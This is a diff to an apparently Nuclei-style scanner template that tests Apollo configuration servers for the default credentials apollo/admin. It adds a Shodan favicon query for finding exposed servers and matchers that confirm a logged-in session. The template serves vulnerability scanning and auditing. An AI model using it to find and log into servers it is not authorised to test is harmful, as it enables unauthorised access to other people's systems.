@@ -1,35 +1,46 @@
 id: apollo-default-login
+
 info:
   name: Apollo Default Login
   author: PaperPen
   severity: high
+  metadata:
+    shodan-query: http.favicon.hash:11794165
+  reference: https://github.com/apolloconfig/apollo
   tags: apollo,default-login
 
 requests:
   - raw:
-    - |
-      POST /signin HTTP/1.1
-      Host: {{Hostname}}
-      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0
-      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-      Accept-Encoding: gzip, deflate
-      Content-Type: application/x-www-form-urlencoded
-      Content-Length: 62
-      Origin: {{BaseURL}}
-      DNT: 1
-      Connection: close
-      Referer: {{BaseURL}}/signin?
-      Upgrade-Insecure-Requests: 1
+      - |
+        POST /signin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/signin?
 
-      username=apollo&password=admin&login-submit=%E7%99%BB%E5%BD%95
+        username={{user}}&password={{pass}}&login-submit=Login
 
-    redirects: true
-    max-redirects: 3
+      - |
+        GET /user HTTP/1.1
+        Host: {{Hostname}}
+
+    attack: pitchfork
+    payloads:
+      user:
+        - apollo
+      pass:
+        - admin
 
     cookie-reuse: true
-
+    req-condition: true
     matchers:
       - type: word
+        part: body_2
         words:
-          - "media='all'"
+          - '"userId":'
+          - '"email":'
+        condition: or
+
+      - type: status
+        status:
+          - 200
